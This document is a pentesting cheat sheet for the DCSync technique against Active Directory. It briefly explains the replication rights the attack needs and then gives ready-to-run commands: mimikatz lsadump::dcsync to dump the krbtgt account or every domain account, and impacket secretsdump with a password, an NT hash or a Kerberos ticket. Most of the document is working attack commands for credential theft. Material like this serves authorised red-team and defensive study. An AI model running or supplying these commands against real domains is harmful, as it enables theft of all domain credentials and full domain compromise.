---
technique: DCSync
category: credential-dumping
protocols: DRSUAPI, SMB, LDAP
remote_capable: true
tags: dcsync credential-dumping domain-admin krbtgt ntds replication ad
---

# DCSync

DCSync simulates the Active Directory replication protocol to pull credential material directly from a domain controller without touching disk. The attack calls `DsGetNCChanges` via the DRSUAPI and retrieves NT hashes, Kerberos keys, and cleartext passwords (when reversible encryption is configured). It requires `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights, held by default by Domain Admins, Enterprise Admins, Administrators, and Domain Controllers.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Replication rights | `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` |
| Network access | Must reach the DC on DRSUAPI (RPC dynamic ports via SMB); secretsdump uses SMB first |
| Kerberos SPN (impacket) | Requires `CIFS/dc` SPN; mimikatz uses LDAP and requires `LDAP/dc` SPN |

## Windows

### Step 1: DCSync single account (mimikatz)

#cmd #mimikatz #replication

Dump a specific account's credential material from an elevated context via the replication protocol.

```cmd title:"DCSync a single account via mimikatz lsadump::dcsync"
lsadump::dcsync /dc:"$dc_fqdn" /domain:"$domain" /user:krbtgt
```
<!-- cheat
import domain_ip
var dc_fqdn
-->

### Step 2: DCSync all accounts (mimikatz)

#cmd #mimikatz #replication

Dump the entire domain's credential material to CSV from an elevated context.

```cmd title:"DCSync all accounts via mimikatz lsadump::dcsync"
lsadump::dcsync /dc:"$dc_fqdn" /domain:"$domain" /all /csv
```
<!-- cheat
import domain_ip
var dc_fqdn
-->

## Linux

### secretsdump (password auth)

#impacket #smb #replication

Perform DCSync remotely using impacket's secretsdump with a plaintext password.

```sh title:"DCSync via secretsdump with password"
secretsdump.py -outputfile dcsync -dc-ip "$rhost_ip" "$domain/$user:$pass@$dc_host"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_host
-->

### secretsdump (NT hash auth)

#impacket #smb #replication #pth

Perform DCSync remotely using impacket's secretsdump with an NT hash.

```sh title:"DCSync via secretsdump with NT hash"
secretsdump.py -outputfile dcsync -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -dc-ip "$rhost_ip" "$domain/$user@$dc_host"
```
<!-- cheat
import domain_ip
import users
var nt_hash
var dc_host
-->

### secretsdump (Kerberos ticket auth)

#impacket #smb #replication #kerberos

Perform DCSync remotely using impacket's secretsdump with a Kerberos ticket.

```sh title:"DCSync via secretsdump with Kerberos ticket"
KRB5CCNAME=ticket.ccache secretsdump.py -k -no-pass -outputfile dcsync -dc-ip "$rhost_ip" "@$dc_host"
```
<!-- cheat
import domain_ip
var dc_host
-->
